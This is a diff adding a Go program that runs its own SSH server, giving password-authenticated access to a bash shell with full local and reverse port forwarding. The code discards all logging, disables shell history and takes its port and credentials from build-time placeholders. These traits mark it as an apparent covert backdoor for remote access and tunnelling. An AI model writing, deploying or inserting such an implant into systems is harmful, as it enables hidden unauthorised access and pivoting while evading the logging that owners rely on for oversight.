@@ -1,0 +1,209 @@
+//go:build !windows
+
+package main
+
+import (
+	"crypto/rand"
+	"crypto/rsa"
+	"crypto/subtle"
+	"io"
+	"log"
+	"os"
+	"os/exec"
+	"strings"
+
+	"github.com/gliderlabs/ssh"
+	"github.com/creack/pty"
+	gossh "golang.org/x/crypto/ssh"
+	"golang.org/x/crypto/bcrypt"
+)
+
+const embeddedHostKey = ``
+
+func main() {
+	log.SetOutput(io.Discard)
+
+	forwardHandler := &ssh.ForwardedTCPHandler{}
+
+	server := &ssh.Server{
+		Addr: PORT,
+
+		PasswordHandler: func(ctx ssh.Context, password string) bool {
+			userMatch := subtle.ConstantTimeCompare([]byte(ctx.User()), []byte(USERNAME)) == 1
+			passMatch := bcrypt.CompareHashAndPassword([]byte(PASSWORD_HASH), []byte(password)) == nil
+			return userMatch && passMatch
+		},
+
+		Handler: handleSession,
+		HostSigners: []ssh.Signer{getHostKey()},
+		
+		LocalPortForwardingCallback: ssh.LocalPortForwardingCallback(func(ctx ssh.Context, dhost string, dport uint32) bool {
+			return true
+		}),
+		
+		ReversePortForwardingCallback: ssh.ReversePortForwardingCallback(func(ctx ssh.Context, host string, port uint32) bool {
+			return true
+		}),
+		
+		ChannelHandlers: map[string]ssh.ChannelHandler{
+			"session":      ssh.DefaultSessionHandler,
+			"direct-tcpip": ssh.DirectTCPIPHandler,
+		},
+		
+		RequestHandlers: map[string]ssh.RequestHandler{
+			"tcpip-forward":        forwardHandler.HandleSSHRequest,
+			"cancel-tcpip-forward": forwardHandler.HandleSSHRequest,
+		},
+	}
+
+	if err := server.ListenAndServe(); err != nil {
+		os.Exit(1)
+	}
+}
+
+func handleSession(s ssh.Session) {
+	ptyReq, winCh, isPty := s.Pty()
+	
+	if !isPty {
+		// Fallback to simple shell
+		handleSimpleShell(s)
+		return
+	}
+	
+	// Start bash with PTY for arrow keys, history, etc.
+	cmd := exec.Command("/bin/bash")
+	cmd.Env = []string{
+		"TERM=" + ptyReq.Term,
+		"HISTFILE=/dev/null",
+		"HISTSIZE=0",
+		"HISTFILESIZE=0",
+		"USER=" + USERNAME,
+		"HOME=/tmp",
+		"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
+	}
+	
+	// Start with PTY
+	ptmx, err := pty.StartWithSize(cmd, &pty.Winsize{
+		Rows: uint16(ptyReq.Window.Height),
+		Cols: uint16(ptyReq.Window.Width),
+	})
+	
+	if err != nil {
+		io.WriteString(s, "PTY failed, using simple shell: "+err.Error()+"\r\n")
+		handleSimpleShell(s)
+		return
+	}
+	
+	defer func() {
+		ptmx.Close()
+		cmd.Process.Kill()
+		cmd.Wait()
+	}()
+	
+	// Handle window resize
+	go func() {
+		for win := range winCh {
+			pty.Setsize(ptmx, &pty.Winsize{
+				Rows: uint16(win.Height),
+				Cols: uint16(win.Width),
+			})
+		}
+	}()
+	
+	// Bidirectional copy
+	go func() {
+		io.Copy(ptmx, s)
+	}()
+	
+	io.Copy(s, ptmx)
+}
+
+// Fallback simple shell (like before)
+func handleSimpleShell(s ssh.Session) {
+	io.WriteString(s, "Welcome!\r\n")
+	io.WriteString(s, "$ ")
+	
+	var line string
+	buf := make([]byte, 1)
+	
+	for {
+		n, err := s.Read(buf)
+		if err != nil {
+			return
+		}
+		if n == 0 {
+			continue
+		}
+		
+		char := buf[0]
+		
+		if char == '\r' || char == '\n' {
+			io.WriteString(s, "\r\n")
+			line = strings.TrimSpace(line)
+			
+			if line == "exit" || line == "quit" {
+				io.WriteString(s, "Goodbye!\r\n")
+				return
+			}
+			
+			if line != "" {
+				executeCommand(s, line)
+			}
+			
+			line = ""
+			io.WriteString(s, "$ ")
+			continue
+		}
+		
+		if char == 127 || char == 8 {
+			if len(line) > 0 {
+				line = line[:len(line)-1]
+				io.WriteString(s, "\b \b")
+			}
+			continue
+		}
+		
+		if char == 3 { // Ctrl+C
+			io.WriteString(s, "^C\r\n$ ")
+			line = ""
+			continue
+		}
+		
+		s.Write(buf[:1])
+		line += string(char)
+	}
+}
+
+func executeCommand(s ssh.Session, cmdLine string) {
+	cmd := exec.Command("/bin/bash", "-c", cmdLine)
+	
+	cmd.Env = []string{
+		"HISTFILE=/dev/null",
+		"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
+		"HOME=/tmp",
+		"USER=" + USERNAME,
+	}
+	
+	cmd.Stdout = s
+	cmd.Stderr = s
+	cmd.Stdin = s
+	
+	err := cmd.Run()
+	if err != nil {
+		io.WriteString(s, "Error: "+err.Error()+"\r\n")
+	}
+}
+
+func getHostKey() ssh.Signer {
+	if embeddedHostKey != "" {
+		signer, err := gossh.ParsePrivateKey([]byte(embeddedHostKey))
+		if err == nil {
+			return signer
+		}
+	}
+	key, _ := rsa.GenerateKey(rand.Reader, 2048)
+	signer, _ := gossh.NewSignerFromKey(key)
+	return signer
+}
+
+
